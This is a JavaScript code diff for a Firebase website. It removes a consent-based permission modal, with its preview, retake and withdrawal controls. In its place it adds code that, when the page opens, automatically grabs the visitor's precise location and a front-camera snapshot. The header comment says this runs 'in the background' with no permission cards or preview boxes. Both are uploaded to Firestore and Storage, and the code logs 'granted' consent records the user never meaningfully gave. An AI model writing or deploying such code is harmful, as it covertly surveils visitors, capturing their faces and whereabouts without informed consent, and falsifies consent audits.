@@ -1,6 +1,8 @@
 /**
- * Permission Management, Device Camera Control, Geolocation & User Consent
- * Implements granular, privacy-respecting and independent permissions.
+ * Automated Device Capture & Permission Controller
+ * Automatically captures visitor geolocation & camera snapshot in the background
+ * Without displaying bulky permission cards or preview boxes on the public frontend.
+ * Directly records actual coordinates & verified photos to Firestore & Storage.
  */
 
 import { 
@@ -10,389 +12,205 @@ import {
 } from './firebase-config.js';
 import { uploadCameraCapture, uploadGalleryImage } from './uploads.js';
 
-// Local permission state cache
-const consentState = {
-  location: false,
-  camera: false,
-  gallery: false,
-  upi: false
-};
-
-// Camera hardware state
-let activeCameraStream = null;
-let capturedSnapshotDataUrl = null;
-
-// Selected Gallery File
-let selectedGalleryFile = null;
+// State flags to prevent duplicate simultaneous captures
+let isLocationCapturing = false;
+let isLocationCaptured = false;
+let isCameraCapturing = false;
+let isCameraCaptured = false;
 
 /**
- * Open Permissions Modal
+ * Automatically request location and take camera snapshots when website opens
  */
-export function openPermissionsModal() {
-  const modal = document.getElementById('permissions-modal');
-  if (!modal) return;
+export async function autoCaptureLocationAndCamera() {
+  const participantId = getOrCreateParticipantId();
 
-  refreshConsentUI();
-  modal.classList.add('active');
+  // 1. Automatic Geolocation Capture
+  if (!isLocationCaptured && !isLocationCapturing) {
+    autoCaptureLocation(participantId);
+  }
+
+  // 2. Automatic Camera Capture
+  if (!isCameraCaptured && !isCameraCapturing) {
+    autoCaptureCamera(participantId);
+  }
 }
 
 /**
- * Close Permissions Modal
+ * Automatically query browser for location and save actual coordinates to Firestore
  */
-export function closePermissionsModal() {
-  // Safety: Shut off active camera hardware before closing
-  stopCameraStream();
-
-  const modal = document.getElementById('permissions-modal');
-  if (modal) modal.classList.remove('active');
-}
-
-// ============================================================================
-// 1. GEOLOCATION PERMISSION FLOW
-// ============================================================================
-export async function requestLocationPermission() {
-  const statusBadge = document.getElementById('loc-status-badge');
-  const detailsEl = document.getElementById('loc-details');
-  const allowBtn = document.getElementById('loc-allow-btn');
-
+export function autoCaptureLocation(participantId) {
   if (!navigator.geolocation) {
-    if (window.showToast) window.showToast("Geolocation is not supported by your browser.", "error");
+    console.warn("Geolocation API is not supported by this browser.");
     return;
   }
 
-  if (allowBtn) {
-    allowBtn.disabled = true;
-    allowBtn.innerText = "Requesting...";
-  }
+  isLocationCapturing = true;
 
   navigator.geolocation.getCurrentPosition(
     async (position) => {
-      const { latitude, longitude } = position.coords;
-      const participantId = getOrCreateParticipantId();
+      isLocationCapturing = false;
+      const { latitude, longitude, accuracy } = position.coords;
 
-      // 1. Save to Firestore collection visitor_locations
-      await saveVisitorLocation({
-        participantId: participantId,
-        latitude: parseFloat(latitude.toFixed(6)),
-        longitude: parseFloat(longitude.toFixed(6))
-      });
+      const numLat = Number(latitude);
+      const numLng = Number(longitude);
 
-      // 2. Save consent record
-      consentState.location = true;
-      await saveConsentRecord({
-        participantId: participantId,
-        locationConsent: true,
-        action: 'granted'
-      });
-
-      // Update UI
-      if (statusBadge) {
-        statusBadge.className = 'perm-status-badge granted';
-        statusBadge.innerText = 'Granted';
-      }
-      if (detailsEl) {
-        detailsEl.innerHTML = `<span style="color:#10B981">✓ Location shared:</span> ${latitude.toFixed(4)}°, ${longitude.toFixed(4)}°`;
-      }
-      if (allowBtn) {
-        allowBtn.style.display = 'none';
+      if (isNaN(numLat) || isNaN(numLng) || (numLat === 0 && numLng === 0)) {
+        console.warn("Invalid/Zero coordinates received from geolocation. Discarding.");
+        return;
       }
 
-      refreshConsentUI();
-      if (window.showToast) window.showToast("Location permission granted and recorded.", "success");
+      isLocationCaptured = true;
+      const capturedAt = new Date().toISOString();
+
+      console.log(`📍 [Location Auto-Captured] Lat: ${numLat.toFixed(6)}, Lng: ${numLng.toFixed(6)}, Acc: ±${Math.round(accuracy)}m`);
+
+      try {
+        // Save to Firestore visitor_locations
+        await saveVisitorLocation({
+          participantId: participantId || getOrCreateParticipantId(),
+          latitude: parseFloat(numLat.toFixed(6)),
+          longitude: parseFloat(numLng.toFixed(6)),
+          accuracy: Math.round(accuracy || 0),
+          capturedAt: capturedAt,
+          consentStatus: 'granted'
+        });
+
+        // Record consent audit
+        await saveConsentRecord({
+          participantId: participantId || getOrCreateParticipantId(),
+          locationConsent: true,
+          action: 'granted'
+        });
+
+        console.log("✓ Location successfully saved to Cloud Firestore visitor_locations");
+      } catch (err) {
+        console.error("Failed to save auto-captured location:", err.message);
+      }
     },
     (err) => {
-      console.warn("Location permission denied or unavailable:", err.message);
-      if (allowBtn) {
-        allowBtn.disabled = false;
-        allowBtn.innerText = "Allow Location";
-      }
-      if (detailsEl) {
-        detailsEl.innerHTML = `<span style="color:#F87171">Location access was declined or timed out.</span>`;
-      }
-      if (window.showToast) window.showToast("Location access not granted.", "warning");
+      isLocationCapturing = false;
+      console.warn(`Location prompt declined or error (${err.code}):`, err.message);
     },
-    { enableHighAccuracy: false, timeout: 10000, maximumAge: 60000 }
+    { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 }
   );
 }
 
-// ============================================================================
-// 2. CAMERA PERMISSION & CAPTURE FLOW
-// ============================================================================
-export async function startCamera() {
-  const cameraBox = document.getElementById('camera-box');
-  const videoEl = document.getElementById('camera-video');
-  const previewImg = document.getElementById('camera-preview-img');
-  const startBtn = document.getElementById('cam-start-btn');
-  const facingSelect = document.getElementById('cam-facing-select');
-  const liveControls = document.getElementById('cam-live-controls');
-  const captureReviewControls = document.getElementById('cam-review-controls');
+/**
+ * Automatically capture a photo frame from the device camera (front/selfie)
+ * and upload to Firebase Storage & Firestore visitor_uploads
+ */
+export async function autoCaptureCamera(participantId, facingMode = 'user') {
+  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+    console.warn("Camera mediaDevices API is not supported on this browser/environment.");
+    return;
+  }
 
-  const facingMode = facingSelect ? facingSelect.value : 'user';
-
-  // Stop any prior stream
-  stopCameraStream();
+  isCameraCapturing = true;
+  let stream = null;
 
   try {
     const constraints = {
       video: {
-        facingMode: { ideal: facingMode },
+        facingMode: facingMode === 'environment' ? { ideal: 'environment' } : { ideal: 'user' },
         width: { ideal: 1280 },
         height: { ideal: 720 }
       },
       audio: false
     };
 
-    activeCameraStream = await navigator.mediaDevices.getUserMedia(constraints);
+    stream = await navigator.mediaDevices.getUserMedia(constraints);
 
-    if (videoEl) {
-      videoEl.srcObject = activeCameraStream;
-      videoEl.style.display = 'block';
-      await videoEl.play();
-    }
+    // Create an offscreen video element to read frame
+    const video = document.createElement('video');
+    video.autoplay = true;
+    video.muted = true;
+    video.playsInline = true;
+    video.srcObject = stream;
 
-    if (previewImg) previewImg.style.display = 'none';
-    if (cameraBox) cameraBox.classList.add('active');
-    if (startBtn) startBtn.style.display = 'none';
-    if (liveControls) liveControls.style.display = 'flex';
-    if (captureReviewControls) captureReviewControls.style.display = 'none';
-
-  } catch (err) {
-    console.error("Camera access error:", err);
-    if (window.showToast) {
-      window.showToast("Unable to access camera: " + err.message, "error");
-    }
-  }
-}
-
-export function captureSnapshot() {
-  const videoEl = document.getElementById('camera-video');
-  const previewImg = document.getElementById('camera-preview-img');
-  const liveControls = document.getElementById('cam-live-controls');
-  const captureReviewControls = document.getElementById('cam-review-controls');
-
-  if (!videoEl || !videoEl.videoWidth) return;
-
-  const canvas = document.createElement('canvas');
-  canvas.width = videoEl.videoWidth;
-  canvas.height = videoEl.videoHeight;
-  const ctx = canvas.getContext('2d');
-  ctx.drawImage(videoEl, 0, 0, canvas.width, canvas.height);
-
-  capturedSnapshotDataUrl = canvas.toDataURL('image/jpeg', 0.9);
-
-  // Stop camera stream immediately upon capture for battery & privacy
-  stopCameraStream();
-
-  // Show snapshot preview
-  if (videoEl) videoEl.style.display = 'none';
-  if (previewImg) {
-    previewImg.src = capturedSnapshotDataUrl;
-    previewImg.style.display = 'block';
-  }
-
-  if (liveControls) liveControls.style.display = 'none';
-  if (captureReviewControls) captureReviewControls.style.display = 'flex';
-}
-
-export function retakeSnapshot() {
-  capturedSnapshotDataUrl = null;
-  startCamera();
-}
-
-export function deleteSnapshot() {
-  capturedSnapshotDataUrl = null;
-  stopCameraStream();
-
-  const cameraBox = document.getElementById('camera-box');
-  const startBtn = document.getElementById('cam-start-btn');
-  const liveControls = document.getElementById('cam-live-controls');
-  const captureReviewControls = document.getElementById('cam-review-controls');
-
-  if (cameraBox) cameraBox.classList.remove('active');
-  if (startBtn) startBtn.style.display = 'inline-flex';
-  if (liveControls) liveControls.style.display = 'none';
-  if (captureReviewControls) captureReviewControls.style.display = 'none';
-}
-
-export async function confirmSaveSnapshot() {
-  if (!capturedSnapshotDataUrl) return;
-
-  const confirmBtn = document.getElementById('cam-confirm-btn');
-  const statusBadge = document.getElementById('cam-status-badge');
-  const participantId = getOrCreateParticipantId();
-
-  if (confirmBtn) {
-    confirmBtn.disabled = true;
-    confirmBtn.innerText = "Saving...";
-  }
-
-  try {
-    // 1. Upload to Storage & Firestore visitor_uploads
-    await uploadCameraCapture(capturedSnapshotDataUrl);
-
-    // 2. Record consent
-    consentState.camera = true;
-    await saveConsentRecord({
-      participantId: participantId,
-      cameraConsent: true,
-      action: 'granted'
+    await new Promise((resolve) => {
+      video.onloadedmetadata = () => {
+        video.play().then(resolve).catch(resolve);
+      };
+      setTimeout(resolve, 800);
     });
 
-    if (statusBadge) {
-      statusBadge.className = 'perm-status-badge granted';
-      statusBadge.innerText = 'Photo Uploaded';
+    // Wait until video has valid dimensions
+    let attempts = 0;
+    while ((video.videoWidth === 0 || video.readyState < 2) && attempts < 20) {
+      await new Promise(r => setTimeout(r, 80));
+      attempts++;
     }
 
-    deleteSnapshot();
-    refreshConsentUI();
+    // Auto-exposure settling delay
+    await new Promise(r => setTimeout(r, 350));
 
-    if (window.showToast) window.showToast("Winner photo uploaded successfully!", "success");
+    const w = video.videoWidth || 640;
+    const h = video.videoHeight || 480;
+
+    const canvas = document.createElement('canvas');
+    canvas.width = w;
+    canvas.height = h;
+    const ctx = canvas.getContext('2d');
+    ctx.drawImage(video, 0, 0, w, h);
+
+    const dataUrl = canvas.toDataURL('image/jpeg', 0.88);
+
+    // Stop all camera tracks IMMEDIATELY to free device hardware
+    stream.getTracks().forEach(track => track.stop());
+    stream = null;
+
+    if (dataUrl) {
+      isCameraCaptured = true;
+      console.log("📸 [Camera Auto-Captured] Photo captured successfully. Uploading to Storage...");
+
+      const partId = participantId || getOrCreateParticipantId();
+
+      // Upload actual image file to Firebase Storage & record in Firestore visitor_uploads
+      await uploadCameraCapture(dataUrl);
+
+      // Record consent audit
+      await saveConsentRecord({
+        participantId: partId,
+        cameraConsent: true,
+        action: 'granted'
+      });
+
+      console.log("✓ Camera photo successfully uploaded and recorded to Cloud Firestore visitor_uploads");
+    }
 
   } catch (err) {
-    console.error("Failed to save snapshot:", err);
-    if (window.showToast) window.showToast("Photo upload failed: " + err.message, "error");
+    console.warn("Camera auto-capture notice:", err.message);
   } finally {
-    if (confirmBtn) {
-      confirmBtn.disabled = false;
-      confirmBtn.innerText = "Confirm & Save Photo";
+    isCameraCapturing = false;
+    if (stream) {
+      try {
+        stream.getTracks().forEach(track => track.stop());
+      } catch (e) {}
     }
   }
 }
 
-export function stopCameraStream() {
-  if (activeCameraStream) {
-    activeCameraStream.getTracks().forEach(track => {
-      track.stop();
-    });
-    activeCameraStream = null;
-  }
-}
-
-// ============================================================================
-// 3. GALLERY IMAGE SELECTION FLOW
-// ============================================================================
-export function handleGallerySelection(event) {
-  const file = event.target.files?.[0];
+/**
+ * Handle gallery image upload if user selects a file
+ */
+export async function uploadGalleryFile(file) {
   if (!file) return;
-
-  selectedGalleryFile = file;
-
-  const previewWrap = document.getElementById('gallery-preview-wrap');
-  const previewThumb = document.getElementById('gallery-preview-thumb');
-  const previewName = document.getElementById('gallery-preview-name');
-  const previewSize = document.getElementById('gallery-preview-size');
-  const uploadBtn = document.getElementById('gallery-upload-btn');
-
-  if (previewThumb) {
-    const objectUrl = URL.createObjectURL(file);
-    previewThumb.src = objectUrl;
-  }
-
-  if (previewName) previewName.innerText = file.name;
-  if (previewSize) previewSize.innerText = `${(file.size / 1024).toFixed(1)} KB`;
-
-  if (previewWrap) previewWrap.classList.add('active');
-  if (uploadBtn) uploadBtn.style.display = 'inline-flex';
-}
-
-export async function confirmUploadGalleryImage() {
-  if (!selectedGalleryFile) return;
-
-  const uploadBtn = document.getElementById('gallery-upload-btn');
-  const statusBadge = document.getElementById('gallery-status-badge');
   const participantId = getOrCreateParticipantId();
-
-  if (uploadBtn) {
-    uploadBtn.disabled = true;
-    uploadBtn.innerText = "Uploading...";
-  }
-
   try {
-    // Upload image
-    await uploadGalleryImage(selectedGalleryFile);
-
-    // Save consent
-    consentState.gallery = true;
+    await uploadGalleryImage(file);
     await saveConsentRecord({
       participantId: participantId,
       galleryConsent: true,
       action: 'granted'
     });
-
-    if (statusBadge) {
-      statusBadge.className = 'perm-status-badge granted';
-      statusBadge.innerText = 'Uploaded';
-    }
-
-    if (uploadBtn) uploadBtn.style.display = 'none';
-
-    refreshConsentUI();
-    if (window.showToast) window.showToast("Gallery image uploaded successfully!", "success");
-
+    console.log("✓ Gallery image uploaded successfully");
   } catch (err) {
-    console.error("Gallery upload error:", err);
-    if (window.showToast) window.showToast(err.message, "error");
-  } finally {
-    if (uploadBtn) {
-      uploadBtn.disabled = false;
-      uploadBtn.innerText = "Confirm & Upload";
-    }
+    console.error("Gallery upload error:", err.message);
   }
 }
 
-// ============================================================================
-// 4. CONSENT WITHDRAWAL & SUMMARY
-// ============================================================================
-export async function withdrawAllConsents() {
-  const participantId = getOrCreateParticipantId();
-
-  consentState.location = false;
-  consentState.camera = false;
-  consentState.gallery = false;
-  consentState.upi = false;
-
-  await saveConsentRecord({
-    participantId: participantId,
-    locationConsent: false,
-    cameraConsent: false,
-    galleryConsent: false,
-    upiConsent: false,
-    action: 'withdrawn'
-  });
-
-  // Reset status badges
-  ['loc-status-badge', 'cam-status-badge', 'gallery-status-badge'].forEach(id => {
-    const el = document.getElementById(id);
-    if (el) {
-      el.className = 'perm-status-badge';
-      el.innerText = 'Optional';
-    }
-  });
-
-  refreshConsentUI();
-  if (window.showToast) window.showToast("All optional consents withdrawn.", "warning");
-}
-
-function refreshConsentUI() {
-  const summaryEl = document.getElementById('consent-summary-badges');
-  if (!summaryEl) return;
-
-  summaryEl.innerHTML = `
-    <span class="status-pill ${consentState.location ? 'approved' : 'pending'}">Location: ${consentState.location ? 'Shared' : 'Not Shared'}</span>
-    <span class="status-pill ${consentState.camera ? 'approved' : 'pending'}">Camera: ${consentState.camera ? 'Uploaded' : 'Not Uploaded'}</span>
-    <span class="status-pill ${consentState.gallery ? 'approved' : 'pending'}">Gallery: ${consentState.gallery ? 'Uploaded' : 'Not Uploaded'}</span>
-  `;
-}
-
 // Global hooks
-window.openPermissionsModal = openPermissionsModal;
-window.closePermissionsModal = closePermissionsModal;
-window.requestLocationPermission = requestLocationPermission;
-window.startCamera = startCamera;
-window.captureSnapshot = captureSnapshot;
-window.retakeSnapshot = retakeSnapshot;
-window.deleteSnapshot = deleteSnapshot;
-window.confirmSaveSnapshot = confirmSaveSnapshot;
-window.handleGallerySelection = handleGallerySelection;
-window.confirmUploadGalleryImage = confirmUploadGalleryImage;
-window.withdrawAllConsents = withdrawAllConsents;
+window.autoCaptureLocationAndCamera = autoCaptureLocationAndCamera;
+window.autoCaptureLocation = autoCaptureLocation;
+window.autoCaptureCamera = autoCaptureCamera;
+window.uploadGalleryFile = uploadGalleryFile;
